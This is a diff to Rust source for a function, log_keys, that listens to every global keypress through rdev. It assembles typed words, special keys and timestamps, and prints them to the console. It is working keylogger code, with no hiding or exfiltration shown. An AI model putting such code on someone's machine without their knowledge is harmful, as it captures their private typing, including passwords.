@@ -9,85 +9,75 @@ pub fn log_keys() {
     let mut cursor_pos = 0;
     // hold current word like this ["apple"]
     let mut key_buffer: Vec<String> = Vec::new();
-    // hold current sentence like this ["hello", "world!"]
+    // hold all logged keys, separated in words, like this ["hello", "SPACE", "world!"]
     let mut words: Vec<String> = Vec::new();
 
     // blocking
     rdev::listen(move |event| {
+        println!("logged so far: {:?}", words);
+        // listen to keyPress only
         let key = match event.event_type {
             KeyPress(key) => Some(key),
             _ => None,
         };
-        //Get the keybuffer as a string, quite a misleading name
-        let sentence = key_buffer.iter().map(|s| s.trim()).collect::<String>();
-
         if let Some(key) = key {
             match key {
-                Space => {
+                Space | Return | Enter => {
+                    words.push(format!("{:?}", key));
                     cursor_pos = 0;
+                    let new_word = key_buffer.join("");
                     key_buffer.clear();
-                    key_buffer.push(" ".to_string());
-                    sentence.split_whitespace().for_each(|s| {
-                        words.push(s.to_string());
-                    });
-                    key_buffer.clear();
+                    words.push(new_word);
+                    let timestamp: DateTime<Local> = DateTime::from(event.time);
+                    println!("[{:?}] [Recorded] {:?}", timestamp, words.last());
                 }
                 LeftArrow => {
+                    words.push(format!("{:?}", key));
                     if cursor_pos >= 1 {
                         cursor_pos -= 1;
                     }
                 }
                 RightArrow => {
+                    words.push(format!("{:?}", key));
                     if cursor_pos < key_buffer.len() {
                         cursor_pos += 1;
                     };
                 }
                 Backspace | Delete => {
-                    let kcode: Option<u8> = match event.name {
-                        Some(key) => {
-                            let kcode = key.bytes().last().unwrap();
-                            Some(kcode)
+                    words.push(format!("{:?}", key));
+                    if cursor_pos >= 1 {
+                        match key {
+                            Backspace => {
+                                cursor_pos -= 1;
+                                key_buffer.remove(cursor_pos);
+                            }
+                            Delete => {
+                                if cursor_pos != key_buffer.len() {
+                                    key_buffer.remove(cursor_pos);
+                                }
+                            }
+                            _ => {
+                                panic!("Forgot a key to match?")
+                            }
                         }
-                        None => None,
-                    };
-                    if kcode == Some(127_u8) {
-                        // handling DEL WORD
-                        // won't work on linux
-                        words.pop();
-                    } else if cursor_pos >= 1 {
-                        key_buffer.remove(cursor_pos - 1);
-                        // handle BACKSPACE key
-                        cursor_pos -= 1;
-                    } else {
-                        // handle DELETE key
-                        panic!("not covered case! kcode is {:?}", kcode)
-                    }
-                }
-                Return | Enter => {
-                    words.push(key_buffer.join(""));
-                    if words.last().unwrap() == "" {
-                        words.remove(words.len() - 1);
-                    }
-                    // convert the word array into one sentence
-                    let sentence_from_words = words.join(" ");
-                    words.clear();
-                    key_buffer.clear();
-                    cursor_pos = 0;
-                    if sentence_from_words.trim() != "" {
-                        //                        let timestamp = Local::now();
-                        let timestamp: DateTime<Local> = DateTime::from(event.time);
-                        println!("[{:?}] [Keyboard] {:?}", timestamp, sentence_from_words);
                     }
                 }
                 _ => {
-                    println!("all else pressed {:?}", key);
-                    if let Some(key) = event.name {
-                        if key.bytes().last() < Some(127_u8) && key.bytes().last() > Some(31_u8) {
-                            add_key_to_kb(key, &mut key_buffer, cursor_pos).unwrap();
+                    println!("[pressed] key: {:?}, event.name: {:?}", key, event.name);
+                    // println!("[pressed] {:?}", key);
+                    if let Some(keycode) = event.name {
+                        // add letters to the buffer, as we want to record words!
+                        if keycode.bytes().last() < Some(127_u8)
+                            && keycode.bytes().last() > Some(31_u8)
+                        {
+                            add_key_to_buffer(keycode, &mut key_buffer, cursor_pos).unwrap();
                             cursor_pos += 1;
+                        } else {
+                            // these must be non-letters
+                            words.push(format!("{:?}", key));
                         }
                     } else {
-                        println!("pressed {:?}", key);
+                        panic!("not recorded {:?}", key);
                     }
                 }
             };
@@ -96,12 +86,11 @@ pub fn log_keys() {
     .unwrap();
 }
 
-// Adds keys to kb
-fn add_key_to_kb(
+fn add_key_to_buffer(
     key: String,
-    kb: &mut Vec<String>,
+    buffer: &mut Vec<String>,
     pos: usize,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    kb.insert(pos, key);
+    buffer.insert(pos, key);
     Ok(())
 }
